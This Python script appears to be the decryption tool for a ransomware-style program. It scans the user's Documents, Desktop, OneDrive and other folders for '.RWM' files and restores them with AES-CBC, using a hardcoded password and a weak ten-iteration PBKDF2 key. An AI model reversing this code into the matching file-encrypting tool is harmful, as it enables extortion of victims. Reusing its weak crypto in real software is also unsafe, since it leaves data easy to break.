import os
import sys
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad



password_key = "password123"

extension = ".RWM"

Folders = [
    "Documents",
    "Downloads",
    "Favorites",
    "Links",
    "Music",
    "Pictures",
    "Saved Games",
    "Videos",
    "OneDrive",
    "Desktop"
]


def decrypt_file(password, file_path):
    with open(file_path, 'rb') as f:
        encrypted_data = f.read()
    
    salt = encrypted_data[:16]
    iv = encrypted_data[16:32]
    ciphertext = encrypted_data[32:]
    
    key = PBKDF2(password, salt, dkLen=32, count=10)
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    
    with open(file_path, 'wb') as f:
        f.write(plaintext)
    
    if file_path.lower().endswith(extension.lower()):
        new_path = file_path.replace(extension, "")
        os.rename(file_path, new_path)
        return new_path
    return file_path



def startDecrypting():
    user_folder = os.path.expanduser("~")
    # print(user_folder)

    for folders in Folders:
        full_folders_path = os.path.join(user_folder, folders)
           
        # print(full_folders_path)

        for root, dirs, files in os.walk(full_folders_path):
            for file in files:
                full_path = os.path.join(root, file)
                # print(full_path)

                # if not full_path.endswith(LocalFileName):
                    # print(full_path)

                if full_path.endswith(extension):
                    # print(full_path)

                    try:
                        output_path = decrypt_file(password_key.encode(), full_path)
                        print(f"SUCCESS: File Decrypted: {output_path}")
                        
                    except ValueError:
                        print(f"ERROR: Incorrect password or corrupted file: {full_path}")


if __name__ == "__main__":
    print("---------------------------")
    startDecrypting()
    print("---------------------------")
